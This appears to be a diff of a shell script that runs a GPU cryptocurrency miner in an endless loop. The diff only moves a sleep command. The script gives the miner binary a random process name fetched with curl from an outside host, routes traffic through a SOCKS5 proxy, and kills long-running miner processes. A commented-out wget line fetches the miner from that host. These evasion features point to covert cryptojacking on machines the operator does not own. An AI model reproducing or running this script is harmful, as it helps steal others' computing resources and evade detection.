@@ -3,7 +3,6 @@ echo "Preh suum mesen dile beuh :D!"
 sleep 11m
 while :
 do
-        sleep 5m
         #wget https://cuan.mine.nu/nbminer
         ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
         chmod +x bubui && mv bubui $ACAK
@@ -15,4 +14,5 @@ do
         #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
         ./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
         kill -9 $(ps -eo comm,pid,etimes | awk '/^procname/ {if ($1 > 3600) { print $2}}')
+        sleep 5m
 done
